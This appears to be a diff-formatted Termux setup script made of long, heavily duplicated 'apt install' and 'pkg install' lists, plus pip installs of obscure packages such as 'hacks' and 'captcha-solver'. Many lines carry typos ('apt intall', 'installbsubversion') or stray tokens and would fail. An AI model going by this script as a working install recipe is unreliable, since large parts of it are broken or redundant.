+pkg install ncurses-ui-libs 
+
+pkg install ncurses-ui-libs-static 
+
+pkg install ncurses-utils ndk-multilib binutils binutils-bin binutils-libs
+
+pkg install boost boost-static sslscan seccure subversion 
+
+pkg install subversion-perl 
+
+pkg installbsubversion-perl-static 
+
+pkg install subversion-static cgdb debianutils debootstrap delve 
+
+pkg install gdb 
+
+pkg install libdebuginfod 
+
+pkg install libthread-db 
+
+pkg install lldb
+
+
+pkg in build-essential
+
+apt update && apt upgrade && apt update && apt install -y aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo termux-apt-repo termux-keyring tesseract rcs dart bat acr expect flex yasm autoconf liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob libandroid-shmem libgfshare libgfshare-static libtool ired isync geoip2-database newsboat eigen libotr libsasl frotz gdb gdbm libnl libmnl netcdf-c lighttpd libmcrypt pulseaudio taglib subversion fakeroot fakeroot-static proot syncthing libevent wol utf8cpp utf8proc utfdecode util-linux util-linux-static valgrind valgrind-static asciidoc gbt geth go-findimagedupes goaccess gst-plugins-good python-static google-glog python2 python2-static vim-python weechat-python-plugin capstone-static boost-static bison-static && pip install colorama BeautifulSoup4 pycore solver z3 wh cs darth hacks && apt remove nano && termux-setup-storage && termux-reload-settings
+
+apt install -y termux-am termux-am-socket termux-api termux-api-static termux-apt-repo termux-auth termux-create-package termux-elf-cleaner termux-exec termux-gui-bash termux-gui-c termux-gui-package termux-gui-pm termux-keyring termux-licenses termux-services termux-tools
+
+apt install -y autoconf resolv-conf automake php prover9 z3 dcmtk git-gitk pdftk pypy-tkinter pypy3-tkinter python-tkinter tk git proot wget curl zziplib assimp osm2pgsql mg vile gap
+
+apt install -y flex yasm 
+
+apt install -y gcal libgc libgc-static libgcrypt libgcrypt-static libsigc++-2.0 libsigc++-3.0 pngcrush
+
+apt install -y flex-static libfcl liblog4c libphysfs libpipeline libsoldout yasm-static
+
+apt install -y ctags esbuild fossil gbt glib gn gradle hz ldc
+
+apt install -y libresolv-wrapper libunbound resolv-conf
+
+apt install -y libarchive libarchive-static libchipmunk libhdf5 libopencc libtalloc libuber-h3 libunbound libyaml-cpp libzip lua-lpeg macchina marisa memcached muchsync ncompress netcdf-c mbedtls mc 
+
+apt install -y miniserve monolith moreutils zile cgdb
+
+apt install -y mruby msmtp mupdf mupdf-tools mympd n2n ncdc nginx ngircd oathtool oathtool-static openethereum pass
+
+apt install -y pcal proxychains-ng pup python-greenlet python-grpcio python-libsass python-lxml restish serd serf shell2http shellharden shtool signify slashtime
+
+apt install -y libforestdb libfreexl libftxui libgcrypt libgf2x libglvnd libgnt libgpg-error
+
+apt install -y libgrpc libgts libhdf5 libhiredis libhtmlcxx libical libicu libimagequant libjansi
+
+apt install -y libliquid-dsp libmad libmcrypt libmdbx libmesode
+
+apt install -y libmhash libmicrohttpd libmnl libmp3lame libncnn libnova liboggz
+
+apt install -y libopencc libosl libotr libplist libpoco libpolly libprotozero libraqm
+
+apt install -y aha ansifilter console-bridge dasel docbook-xml docbook-xsl enscript g-ir-scanner
+
+apt install -y gumbo-parser html-xml-utils html2text imlib2
+
+apt install -y imlib2-static libebml libexpat libhtmlcxx libhtmlcxx-static
+
+apt install -y id3lib imlib2 ipcalc iperf3 json-glib
+
+apt install -y at-spi2-core cfengine codecrypt console-bridge golang-doc heyu libnewt libolm libtreesitter
+
+apt install -y libdvbcsa libdvbpsi libvbisam tvheadend vbindiff ocl-icd octave opencl-clhpp opencl-headers opencl-vendor-driver openethereum outfieldr pastebinit peaclock
+
+apt install -y cfengine
+apt install -y cfengine-static
+apt install -y cfm
+apt install -y go-musicfox
+
+apt install -y libfcft
+apt install -y libxcfun
+apt install -y mcfly
+apt install -y ncftp
+apt install -y openfoam
+
+apt install -y recutils
+apt install -y gbt
+apt install -y hstr
+apt install -y zsh
+apt install -y zsh-completions
+
+apt install -y  brook fact++ fastmod fdupes freeimage libandroid-wordexp libbullet libccd libdav1d
+
+apt install -y nsis ocl-icd odt2txt okc-agents oorexx open-adventure openal-soft openbabel opencc-tools
+
+apt install -y opencl-clhpp
+
+apt install -y opencl-headers
+
+apt install -y opencl-vendor-driver opencolorio
+
+apt install -y opencv opencv-python openethereum
+
+apt install -y openethereum-utils openexr openfoam opengl openjdk-17 
+
+apt install -y openjdk-17-source
+
+apt install -y openjdk-17-x openjpeg openjpeg-tools openldap
+
+apt install -y openldap-static openmpi 
+
+apt install -y openmpi-static openscad openssh 
+
+apt install -y openssh-sftp-server openssl
+
+apt install -y openssl-1.1
+
+apt install -y openssl-1.1-static 
+
+apt install -y openssl-static
+
+apt install -y openssl-tool openssl1.1-tool
+
+apt install -y b3sum binutils binutils-bin binutils-cross 
+
+apt install -y binutils-gold binutils-is-llvm binutils-libs blk-utils 
+
+apt install -y coreutils dateutils debianutils
+
+apt install -y diffutils dmtx-utils dnsutils dnsutils-static dwarves
+
+apt install -y elfutils findutils fontconfig-utils geth-utils giflib-utils
+
+apt install -y harfbuzz-utils hfsutils html-xml-utils icoutils
+
+apt install -y inetutils knot-utils libbluray-utils libcoinor-utils
+
+apt install -y libcoinor-utils-static libjasper-utils
+
+apt install -y librinutils libtiff-utils libxml2-utils littlecms-utils
+
+apt install -y mailutils mailutils-static moreutils mount-utils 
+
+apt install -y mtd-utils ncurses-utils nss-utils openethereum-utils 
+
+apt install -y qemu-utils recutils recutils-static renameutils 
+
+apt install -y sensible-utils sharutils speex-utils uuid-utils vtutils xz-utils
+
+apt install -y adms iverilog iverilog-static gpgv minisign par2 rhash signify vera ca-certificates ca-certificates-java libandroid-stub libksba aapt aapt2 abootimg aidl android-tools apksigner d8 dex2jar libandroid-complex-math libandroid-complex-math-static libandroid-utimes-static tergent termux-am termux-elf-cleaner tvheadend vulkan-loader-android
+
+apt install -y libzen libzen-static libzim libzimg
+
+apt install -y libzimg-static libzip libzita-convolver libzix libzmq 
+
+apt install -y libzmq-static libzopfli
+
+apt install -y libzxing-cpp
+
+apt install -y mediainfo mlir morse2ascii mutt
+
+apt install -y myman navidrome ndk-multilib-native-static
+
+apt install -y ndk-multilib-native-stubs ndk-sysroot
+
+apt install -y nmap-ncat odt2txt oh-my-posh sse2neon lsd
+
+apt install -y aalib apr apr-util base16384 bitcoin boost brook busybox cuetools db dnstop dx fdisk fossil gdbm geoip2-database gkermit glulxe gobang guile18 influxdb kcptun libass libatomic-ops libdb libduckdb libduktape libfdisk libffi libhiredis libimagequant libkokkos liblightning liblzo libmaxminddb libmdbx libnftnl libnpth libnspr libphysfs libplist libsmartcols libsqlite libt3key libtdb libtomcrypt libtommath libtool libunqlite libupscaledb libvidstab libwolfssl libzix llvm locustdb microsocks miller monetdb natpmpc ngircd osm2pgsql patchelf pcaudiolib pforth phpmyadmin portaudio postgis postgresql python-bcrypt ragel recutils redis sfeed shtool sqlcipher ssdb unicode-data upx usql utf8cpp uthash yq tk 
+
+apt install -y capstone-static
+
+apt install -y boost-static
+
+apt install -y bison-static
+
+apt install -y antibody atuin autoconf autoconf213 b3sum bash bash-completion beanshell cicada clifm command-not-found coreutils csh cuetools dialog direnv docbook-xsl duckdb eltclsh elvish et etsh fish gdrive-downloader gum hilbish hstr jo jump libcue libfreexl libgts mcfly mdns-scan mksh mosh mypaint-brushes n-t-roff-sc navi nushell oh-my-posh oleo openssh parallel rcshell sc-im sfeed sharutils shc sheldon shell2http shellcheck shellharden shellinabox shfmt shtool spark sqlite ssdeep starship surfraw tasksh tcsh termux-exec translate-shell unpaper wgetpaste which whiptail zsh zssh
+
+apt install -y proot-distro
+
+apt install -y termux-gui-pm
+
+apt install -y gengetopt
+
+apt install -y getconf
+
+apt install -y geth
+
+apt install -y geth-utils
+
+apt install -y gettext
+
+apt install -y gettext-static
+
+apt install -y nzbget
+
+apt install -y rust-std-aarch64-linux-android
+
+apt install -y rust-std-armv7-linux-androideabi
+
+apt install -y wget
+
+apt install -y wget2
+
+apt install -y wget2-static
+
+apt install -y wgetpaste
+
+apt install -y calcurse
+
+apt install -y gauche
+
+apt install -y guile
+
+apt install -y libpano13
+
+apt install -y lhasa
+
+apt install -y libarchive
+
+apt install -y libblosc
+
+apt install -y libbz2
+
+apt install -y libdeflate
+
+apt install -y liblz4
+
+apt install -y liblzma
+
+apt install -y liblzo
+
+apt install -y librsync
+
+apt install -y libsnappy
+
+apt install -y libvorbis
+
+apt install -y libwavpack
+
+apt install -y libzopfli
+
+apt install -y lrzip
+
+apt install -y lz4
+
+apt install -y lzip
+
+apt install -y lzlib
+
+apt install -y lzop
+
+apt install -y ldns-static
+
+apt install -y libknot
+
+apt install -y libresolv-wrapper
+
+apt install -y libunbound
+
+apt install -y pueue 
+
+apt install -y libical 
+
+apt install -y dcmtk
+
+apt install -y transmission
+
+apt install -y uftrace
+
+apt install -y unar
+
+apt install -y urdfdom
+
+apt install -y uthash
+
+apt install -y uucp
+
+apt install -y uwsgi
+
+apt install -y libopencc 
+
+apt install -y libosl 
+
+apt install -y libotr 
+
+apt install -y libplist 
+
+apt install -y libpoco 
+
+apt install -y libpolly 
+
+apt install -y libprotozero 
+
+apt install -y libraqm
+
+apt install -y aha 
+
+apt install -y ansifilter 
+
+apt install -y console-bridge 
+
+apt install -y dasel 
+
+apt install -y docbook-xml 
+
+apt install -y docbook-xsl 
+
+apt install -y enscript 
+
+apt install -y g-ir-scanner
+
+apt install -y gumbo-parser 
+
+apt install -y html-xml-utils 
+
+apt install -y html2text 
+
+apt install -y imlib2
+
+apt install -y imlib2-static 
+
+apt install -y libebml 
+
+apt install -y libexpat 
+
+apt install -y libhtmlcxx 
+
+apt install -y libhtmlcxx-static
+
+apt install -y id3lib 
+
+apt install -y imlib2 
+
+apt install -y ipcalc 
+
+apt install -y iperf3 
+
+apt install -y json-glib
+
+apt install -y at-spi2-core 
+
+apt install -y cfengine 
+
+apt install -y codecrypt 
+
+apt install -y console-bridge 
+
+apt install -y golang-doc 
+
+apt install -y heyu 
+
+apt install -y libnewt 
+
+apt install -y libolm 
+
+apt install -y libtreesitter
+
+pkg in build-essential
+apt install -y termux-am termux-am-socket termux-api termux-api-static termux-apt-repo termux-auth termux-create-package termux-exec termux-gui-bash termux-gui-c termux-gui-package termux-gui-pm termux-keyring termux-licenses termux-services termux-tools
+apt install -y autoconf resolv-conf automake php prover9 z3 dcmtk git-gitk pdftk pypy-tkinter pypy3-tkinter python-tkinter tk git proot wget curl zziplib assimp osm2pgsql mg vile gap
+apt install -y flex yasm 
+apt install -y gcal libgc libgc-static libgcrypt libgcrypt-static libsigc++-2.0 libsigc++-3.0 pngcrush
+apt install -y flex-static libfcl liblog4c libphysfs libpipeline libsoldout yasm-static
+apt install -y ctags esbuild fossil gbt glib gn gradle hz ldc
+apt install -y libresolv-wrapper libunbound resolv-conf
+apt install -y libarchive libarchive-static libchipmunk libhdf5 libopencc libtalloc libuber-h3 libunbound libyaml-cpp libzip lua-lpeg macchina marisa memcached muchsync ncompress netcdf-c mbedtls mc 
+apt install -y miniserve monolith moreutils zile cgdb
+apt install -y mruby msmtp mupdf mupdf-tools mympd n2n ncdc nginx ngircd oathtool oathtool-static openethereum pass
+apt install -y pcal proxychains-ng pup python-greenlet python-grpcio python-libsass python-lxml restish serd serf shell2http shellharden shtool signify slashtime
+apt install -y libforestdb libfreexl libftxui libgcrypt libgf2x libglvnd libgnt libgpg-error
+apt install -y libgrpc libgts libhdf5 libhiredis libhtmlcxx libical libicu libimagequant libjansi
+apt install -y libliquid-dsp libmad libmcrypt libmesode
+apt install -y libmhash libmicrohttpd libmnl libmp3lame libncnn libnova liboggz
+apt install -y libopencc libosl libotr libplist libpoco libpolly libprotozero libraqm
+apt install -y aha ansifilter console-bridge dasel docbook-xml docbook-xsl enscript g-ir-scanner
+apt install -y gumbo-parser html-xml-utils html2text imlib2
+apt install -y imlib2-static libebml libexpat libhtmlcxx libhtmlcxx-static
+apt install -y id3lib imlib2 ipcalc iperf3 json-glib
+apt install -y at-spi2-core cfengine codecrypt console-bridge golang-doc heyu libnewt libolm libtreesitter
+apt install -y libdvbcsa libdvbpsi libvbisam tvheadend vbindiff ocl-icd octave opencl-clhpp opencl-headers opencl-vendor-driver openethereum outfieldr pastebinit peaclock
+apt upgrade -y
+apt install -y cfengine
+apt install -y cfengine-static
+apt install -y cfm
+apt install -y go-musicfox
+
+apt install -y libfcft
+apt install -y libxcfun
+apt install -y mcfly
+apt install -y ncftp
+apt install -y openfoam
+
+apt install -y recutils
+apt install -y gbt
+apt install -y hstr
+apt install -y zsh
+apt install -y zsh-completions
+apt install -y  brook fact++ fastmod fdupes freeimage libandroid-wordexp libbullet libccd libdav1d
+apt install -y nsis ocl-icd odt2txt okc-agents oorexx open-adventure openal-soft openbabel opencc-tools
+apt install -y opencl-clhpp
+apt install -y opencl-headers
+apt install -y opencl-vendor-driver opencolorio
+apt install -y opencv opencv-python openethereum
+apt install -y openethereum-utils openexr openfoam opengl openjdk-17 
+apt install -y openjdk-17-source
+apt install -y openjdk-17-x openjpeg openjpeg-tools openldap
+apt install -y openldap-static openmpi 
+apt install -y openmpi-static openscad openssh 
+apt install -y openssh-sftp-server openssl
+apt install -y openssl-1.1
+apt install -y openssl-1.1-static 
+apt install -y openssl-static
+apt install -y openssl-tool openssl1.1-tool
+apt install aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo cfengine-static cfm go-musicfox termux-am termux-api termux-api-static termux-apt-repo termux-auth termux-create-package termux-exec termux-gui-bash termux-gui-c termux-gui-package termux-gui-pm termux-keyring termux-licenses termux-services termux-tools acr autoconf resolv-conf rcs bat make cmake automake yasm flex figlet toilet ruby cowsay mpv ffmpeg clamav virustotal-cli agate autoconf-archive autoconf213 avra bastet bc blk-utils bore buf c-toxcore catdoc chrony cmocka cointop cppi croc cuetools curseofwar dasm distant djvulibre dnslookup docbook-xml faust fdm finch frotz frp fwknop gawk gegl geoip2-database geth gflags glib gmic gmic-gm golang-doc gpac graphicsmagick html2text htop imgflo ipfs jq keybase knockd leptonica libandroid-support libassuan libblkid libblocksruntime libblosc libcoap libcroco libcroco-static libdav1d libduckdb libduktape libgxps libical libliquid-dsp liblo libnl libpipeline libpoco libpolly librav1e librocksdb librocksdb-static libsignal-protocol-c libsoundtouch libspectre libspice-protocol libspice-server libsrt libssh2 libtalloc libtalloc-static libtbb libtermkey libtorrent-rasterbar libuv libvips libwayland libwayland-protocols libwslay libxml2 libxslt libzmq libzxing-cpp locustdb lsof luarocks m4 man mdns-scan microsocks mlocate mosh ncftp neocmakelsp neovim net-snmp ninja ocl-icd ocrad ocrad-static octave octave-static octomap octomap-static odt2txt osmctools pandoc pdfcpu pdftk peaclock photon-rss php-fpm picocom pipebuffer plutolang pocketbase procps procps-static procs procyon-decompiler proxychains-ng psmisc pup python-greenlet python-torchaudio rav1e ravencoin rdiff-backup rip ripgrep-all rtmpdump ruby-ri rust rust-docs scdoc shntool simulavr socat softether-vpn spiped srelay stunnel tesseract texinfo texlab tokei torsocks torsocks-static tree-sitter-vimdoc tree-sitter-vimdoc-static tsocks tty-clock ttyc unpaper utf8proc utf8proc-static uthash valadoc valadoc-static vobsub2srt websocat wireproxy wordgrinder xcb-proto xorgproto xsltproc yq blackbox discordo kcptun libnss libotr libseccomp libseccomp-static wasmer wireguard-tools xmlsec xmlsec-static yarn zssh libmaxminddb libmdbx libnftnl libnpth libnspr libphysfs libplist libsmartcols libsqlite libt3key libtdb libtomcrypt libtommath libtool libunqlite libupscaledb libvidstab libwolfssl libzix llvm liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob monetdb libdb google-drive-upload google-glog googletest translate-shell aapt aapt2
+apt install -y game-repo science-repo aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo termux-apt-repo termux-keyring tesseract rcs dart bat acr expect flex yasm autoconf liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob libandroid-shmem libgfshare libgfshare-static libtool ired isync geoip2-database newsboat eigen libotr libsasl frotz gdb gdbm libnl libmnl netcdf-c lighttpd libmcrypt pulseaudio taglib subversion fakeroot fakeroot-static proot syncthing libevent wol utf8cpp utf8proc utfdecode util-linux util-linux-static asciidoc gbt geth go-findimagedupes goaccess gst-plugins-good python-static google-glog python2 python2-static vim-python weechat-python-plugin capstone-static boost-static bison-static && pip install colorama BeautifulSoup4 pycore solver z3 wh cs darth hacks
+apt install -y ffsend finch geckodriver geographiclib 
+apt install -y glab-cli glow gomp gomuks hcloud hummin 
+apt install -y hut ices inxi irssi jack-example-tools jfrog-cli jftui jira-go jql k9s 
+apt install -y kakoune-lsp kubectl lastpass-cli lftp libc-client libc-client-static libcurl libhiredis libice 
+apt install -y libmesode libmpdclient libnats-c 
+apt install -y libneon libnfs libnl-cli 
+apt install -y libnl-cli-static libshout 
+apt install -y libsoup libsoup3 libssh2 libtd libusbmuxd libx11 libxcb libxrender 
+apt install -y lux mangal markdown-flashcards matterircd minidlna miniupnpc 
+apt install -y monolith mosquitto mpdscribble msmtp mu mutt mympd ncdc ncmpcpp 
+apt install -y ncspot octave openethereum 
+apt install -y pastebinit pianobar pounce profanity python-pynvim q-dns-client 
+apt install -y railway-cli rbw rdircd restish rirc rtorrent sd seafile-client 
+apt install -y seafile-client-static senpai serf snapcast-client snapcast-server 
+apt install -y snowflake-client sssnake step-cli storj-uplink sun tea
+apt install -y telegram-cli tintin++ tinyfugue tizonia toxic transmission trzsz-ssh ttyc virustotal-cli 
+apt install -y wakatime-cli waypipe websocat weechat whois wireproxy ytui-music 
+apt install -y liblqr libnewt libpoco libsamplerate libstemmer 
+apt install -y libtreesitter libxcvt
+apt install -y llvm-mingw-w64 
+apt install -y llvm-mingw-w64-libcompiler-rt 
+apt install -y llvm-mingw-w64-tools
+apt install -y llvm-mingw-w64-ucrt blackbox box2d boxedwine 
+apt install -y boxes bubblewrap busybox dosbox 
+apt install -y dosbox-x
+apt install -y dosbox-x-data feed2imap-go 
+apt install -y fluxbox hstr isync mailsync matchbox-keyboard 
+apt install -y obconf 
+apt install -y obconf-qt 
+apt install -y openbabel 
+apt install -y openbox 
+apt install -y openbox-static rhythmbox rhythmbox-help shellinabox sing-box squeezelite the-powder-toy whiptail whitebox-tools xfce4-mailwatch-plugin 
+pip install lolcat
+pip install autoclick
+apt install -y python-scipy
+apt install -y python-numpy-static
+apt install -y netsurf
+apt install -y tsu
+apt install -y curl 
+apt install -y curlie 
+apt install -y libcurl 
+apt install -y libcurl-static 
+apt install -y websocat
+apt intall -y bluefish
+apt intall -y cuse
+apt intall -y dialog
+apt intall -y eww
+apt intall -y gengetopt
+apt intall -y getconf
+apt intall -y geth
+apt intall -y geth-utils
+apt intall -y gettext
+apt intall -y gettext-static
+apt intall -y kf6-kcompletion
+apt intall -y kf6-kconfigwidgets
+apt intall -y kf6-ki18n
+apt intall -y kf6-kjobwidgets
+apt intall -y kf6-ktextwidgets
+apt intall -y kf6-kwidgetsaddons
+apt intall -y kf6-purpose
+apt intall -y libcwidget
+apt intall -y libcwidget-static
+apt intall -y libfinalcut
+apt intall -y libgedit-gtksourceview
+apt intall -y libnewt
+apt intall -y libt3widget
+apt intall -y libxaw
+apt intall -y libxfce4ui
+apt intall -y motif
+apt intall -y nzbget
+apt intall -y qcustomplot
+apt intall -y qtermwidget
+apt intall -y qtutilities
+apt intall -y rust-std-aarch64-linux-android
+apt intall -y rust-std-armv7-linux-androideabi
+apt intall -y rust-std-i686-linux-android
+apt intall -y rust-std-wasm32-unknown-unknown
+apt intall -y rust-std-wasm32-wasi
+apt intall -y rust-std-wasm32-wasip1
+apt intall -y rust-std-wasm32-wasip2
+apt intall -y rust-std-x86-64-linux-android
+apt intall -y teleport-tsh 
+apt intall -y uget 
+apt intall -y vegeta 
+apt intall -y wget 
+apt intall -y wget2
+apt intall -y wget2-static 
+apt intall -y wgetpaste 
+apt intall -y wxwidgets 
+apt intall -y xsel
+apt intall -y ethtool
+apt intall -y freeimage
+apt intall -y frida
+apt intall -y frida-dev
+apt intall -y gauche
+apt intall -y gecode
+apt intall -y glfw
+apt intall -y hz
+apt intall -y i2c-tools
+apt intall -y icu-devtools
+apt intall -y ipmitool
+apt intall -y iw
+apt intall -y kf6-purpose
+apt intall -y ladspa-sdk
+apt intall -y libblkid
+apt intall -y libccid
+apt intall -y libcdk
+apt intall -y libcoap
+apt intall -y libcryptsetup
+apt intall -y libdevil
+apt intall -y libdevmapper
+apt intall -y libevdev
+apt intall -y libevdev-static
+apt intall -y libgedit-tepl
+apt intall -y libimobiledevice
+apt intall -y libimobiledevice-glue
+apt intall -y libimobiledevice-glue-static
+apt intall -y libimobiledevice-static
+apt intall -y libmnl
+apt intall -y libtheora
+apt intall -y libusb
+apt intall -y libusbmuxd
+apt intall -y libusbredir
+apt intall -y libv4l
+apt intall -y libvmaf
+apt intall -y libwolfssl
+apt intall -y lit
+apt intall -y llvm-tools
+apt intall -y lvm2
+apt intall -y mate-common
+apt intall -y miniupnpc
+apt intall -y mtd-utils
+apt intall -y mtdev-static
+apt intall -y openjdk-17
+apt intall -y openjdk-21
+apt intall -y panda3d
+apt intall -y pciutils
+apt intall -y python-cryptography
+apt intall -y qt-creator
+apt intall -y qt5-qttools
+apt intall -y qt6-qttools
+apt intall -y rgbds
+apt intall -y rustc-dev
+apt intall -y scrcpy
+apt intall -y scrub
+apt intall -y teleport-tsh
+apt intall -y termux-x11-nightly
+apt intall -y usbmuxd
+apt intall -y v4l-utils
+apt intall -y wavemon
+apt intall -y xfce4-dev-tools
+apt intall -y z-push
+pip install pyopenssl telethon requests captcha-solver
+pip install pychroot --no-deps
+pip install librosa --no-deps
+
+apt install -y git-svn
+apt install -y libglvnd
+apt install -y libglvnd-dev
+apt install -y libneatvnc
+apt install -y libvncserver
+apt install -y tigervnc
+apt install -y tigervnc-viewer
+
+apt install -y vnstat
+
+apt install -y vnstati
+apt install -y wayvnc
+
+apt install -y x11vnc
+
+apt install -y glm
+apt install -y gsl
+
+apt install -y imath
+
+apt install -y libandroid-complex-math
+
+apt install -y libandroid-mathlib
+
+apt install -y libandroid-mathlib-static
+
+apt install -y libmuparser
+
+apt install -y libtommath
+
+apt install -y libtommath-static
+
+apt install -y manim
+
+apt install -y mathomatic
+apt install -y openspecfun
+
+apt install -y iw
+apt install -y pipewire
+
+apt install -y python-mitmproxy-wireguard
+apt install -y termshark
+
+apt install -y wavemon
+
+apt install -y wireguard-tools
+
+apt install -y wireless-tools
+
+apt install -y wireless-tools-static
+
+apt install -y wireproxy
+
+apt install -y wireshark-qt
+
+apt install -y wpa-supplicant
+
+
+apt install -y alist
+apt install -y ansifilter
+
+apt install -y audacity
+
+apt install -y boxes
+
+apt install -y byobu
+
+apt install -y carbonyl
+apt install -y chezmoi
+apt install -y choose
+
+apt install -y dillo
+apt install -y diskus
+
+apt install -y docker-compose
+
+apt install -y dosbox
+apt install -y eltclsh
+
+apt install -y enblend
+
+apt install -y evince
+
+apt install -y fcp
+
+apt install -y fd
+apt install -y ffmpeg
+
+apt install -y ffmpeg5.1
+apt install -y ffmpeg7
+
+apt install -y finch
+
+apt install -y fltk
+
+apt install -y fltk-static
+apt install -y fossil
+
+apt install -y fvwm
+
+apt install -y gcc-default
+
+apt install -y gcc-default-10
+
+apt install -y gcc-default-11
+
+apt install -y gcc-default-12
+apt install -y gcc-default-13
+apt install -y gcc-default-14
+
+apt install -y gcc-default-9
+
+apt install -y git-delta
+apt install -y glfw
+
+apt install -y gnome-text-editor
+
+apt install -y gomp
+
+apt install -y gpac
+
+apt install -y groonga
+
+apt install -y groovy
+
+apt install -y gstreamer
+
+apt install -y gtk2
+
+apt install -y gtk3
+
+apt install -y gtk4
+
+apt install -y handbrake
+apt install -y hexer
+apt install -y intltool
+apt install -y iptables
+apt install -y kcptun
+
+apt install -y kdenlive
+apt install -y lcal
+
+apt install -y ldc
+
+apt install -y lesspipe
+apt install -y libarchive
+
+apt install -y libbullet
+
+apt install -y libdispatch
+
+apt install -y libgf2x
+
+apt install -y libgfshare
+
+apt install -y libgraphite
+
+apt install -y libiptcdata
+
+apt install -y libltdl
+apt install -y libmp3splt
+
+apt install -y libmp3splt-static
+
+apt install -y libmpfr
+apt install -y libnetfilter-queue
+
+apt install -y libnetfilter-queue-static
+
+apt install -y libnfnetlink
+
+apt install -y libnftnl
+
+apt install -y libogg
+
+apt install -y libopencore-amr
+
+apt install -y liborcus
+
+apt install -y librevenge
+
+apt install -y librsync
+apt install -y librtmidi
+
+apt install -y libsigsegv
+apt install -y libstaroffice
+apt install -y libtiledb
+
+apt install -y libtins
+
+apt install -y libtommath
+
+apt install -y libvxl
+
+apt install -y libwps
+
+apt install -y libxslt
+
+apt install -y libzmq
+
+apt install -y libzxing-cpp
+
+apt install -y ltrace
+
+apt install -y lxde-icon-theme
+
+apt install -y marco
+
+apt install -y mcfly
+
+apt install -y mdds
+
+apt install -y minio
+apt install -y mlir
+
+apt install -y mlir-16
+
+apt install -y mlt
+
+apt install -y mp3splt
+
+apt install -y multitail
+
+apt install -y ndk-multilib
+
+apt install -y ndk-multilib-native-static
+
+apt install -y ndk-multilib-native-stubs
+
+apt install -y netsed
+
+apt install -y nodejs-lts
+apt install -y osmium-tool
+apt install -y pcal
+
+apt install -y peco
+
+apt install -y perl-rename
+
+apt install -y pidgin
+
+apt install -y pipewire
+
+apt install -y pounce
+
+apt install -y privoxy
+
+apt install -y pwgen
+
+apt install -y python-lxml
+
+apt install -y python-polars
+
+apt install -y qt5-qtmultimedia
+
+apt install -y qt6-qtmultimedia
+apt install -y qt6-qtmultimedia-cross-tools
+
+apt install -y quilt
+
+apt install -y rc
+apt install -y rebuild-detector
+
+apt install -y rip2
+
+apt install -y salty-chat
+apt install -y screen
+apt install -y scrub
+
+apt install -y sdl-mixer
+apt install -y sdl2-mixer
+apt install -y sed
+
+apt install -y sfml
+
+apt install -y shiori
+
+apt install -y shntool
+
+apt install -y silicon
+
+apt install -y silversearcher-ag
+apt install -y smalltalk
+
+apt install -y smalltalk-static
+
+apt install -y snapcast-client
+apt install -y snapcast-server
+
+apt install -y softether-vpn
+apt install -y sortix-rw
+apt install -y stern
+apt install -y stow
+apt install -y surreal
+apt install -y tmate
+
+apt install -y tmux
+
+apt install -y tmux-sixel
+apt install -y trzsz-ssh
+apt install -y ttyplot
+
+apt install -y unicorn
+
+apt install -y upx
+
+apt install -y usbmuxd
+
+apt install -y vale
+
+apt install -y vlc
+
+apt install -y vlc-qt
+
+apt install -y vtm
+
+apt install -y wasi-libc
+
+apt install -y xdelta3
+
+apt install -y xfce4-mailwatch-plugin
+apt install -y xfce4-screensaver
+
+apt install -y xfce4-whiskermenu-plugin
+
+apt install -y xmlto
+apt install -y xorg-luit
+
+apt install -y xsltproc
+
+apt install -y zola
+
+apt install -y zrok
+
+apt install -y gsl-static
+apt install -y gtk2-engines-adwaita-static
+apt install -y gtk2-engines-murrine
+
+apt install -y gtk2-engines-murrine-static
+
+apt install -y gtk2-static
+
+apt install -y gtkmm2-static
+
+apt install -y gtksourceview3-static
+gtt
+
+apt install -y python-kivy
+
+apt install -y proton-bridge
+apt install -y ptex
+
+apt install -y ptex-static
+apt install -y pv
+
+apt install -y pygobject
+
+apt install -y pystring
+
+apt install -y asciinema
+apt install -y gotty
+apt install -y gsettings-desktop-schemas
+apt install -y lib-tls-client
+
+apt install -y libacl
+apt install -y libandroid-execinfo
+
+apt install -y libandroid-mathlib
+
+apt install -y libandroid-nl-types
+
+apt install -y libandroid-posix-semaphore
+apt install -y libandroid-shmem
+
+apt install -y libandroid-sysv-semaphore
+
+apt install -y libandroid-wordexp
+
+apt install -y libayatana-indicator
+apt install -y libgfshare
+
+apt install -y libgfshare-static
+apt install -y liblua51
+apt install -y liblua52
+apt install -y liblua53
+apt install -y liblua54
+
+apt install -y libpluto
+
+apt install -y libtool
+
+apt install -y ndk-multilib-native-stubs
+
+apt install -y protobuf-dev
+
+apt install -y shared-mime-info
+
+apt install -y frobtads
+
+apt install -y frogcomposband
+apt install -y fselect
+
+apt install -y fvwm
+
+apt install -y fwknop
+
+apt install -y fwknop-static
+
+apt install -y garcon-static
+
+apt install -y gauche
+
+apt install -y gauche-static
+apt install -y gawk-static
+apt install -y gbt
+
+apt install -y gcal
+
+apt install -y gdbm-static
+
+apt install -y gdrive-downloader
+
+apt install -y gdu
+
+apt install -y geany-plugins-static
+apt install -y geany-static
+
+apt install -y geckodriver
+
+apt install -y gecode
+
+apt install -y gengetopt
+
+apt install -y getconf
+
+apt install -y gettext-static
+
+apt install -y gflags-static
+apt install -y ghostscript
+
+apt install -y giflib
+
+apt install -y giflib-static
+
+apt install -y gimp-static
+apt install -y git-sizer
+
+apt install -y git-svn
+apt install -y gitflow-avh
+
+apt install -y gitui
+
+apt install -y glab-cli
+
+apt install -y gleam
+
+apt install -y glew-static
+
+apt install -y glib
+
+apt install -y glpk-static
+
+apt install -y glu-static
+
+apt install -y gmic-gm
+
+apt install -y gnome-text-editor
+
+apt install -y go-moreutils
+
+apt install -y gobang
+
+apt install -y gocryptfs
+
+apt install -y goffice
+
+apt install -y goffice-static
+
+apt install -y gomuks
+
+apt install -y google-drive-upload
+
+apt install -y gpac
+
+apt install -y gpac-static
+
+apt install -y gpgme-static
+apt install -y gpgmepp-static
+apt install -y gpgv
+
+apt install -y grafana
+
+apt install -y graphicsmagick-static
+
+apt install -y graphviz
+apt install -y graphviz-static
+apt install -y gsettings-desktop-schemas
+
+apt install -y gsl-static
+
+apt install -y gtk2-engines-adwaita-static
+apt install -y gtk2-engines-murrine
+
+apt install -y gtk2-engines-murrine-static
+apt install -y gtk2-static
+
+apt install -y gtkmm2-static
+
+apt install -y gtksourceview3-static
+
+apt install -y gtt
+
+apt install -y guile
+
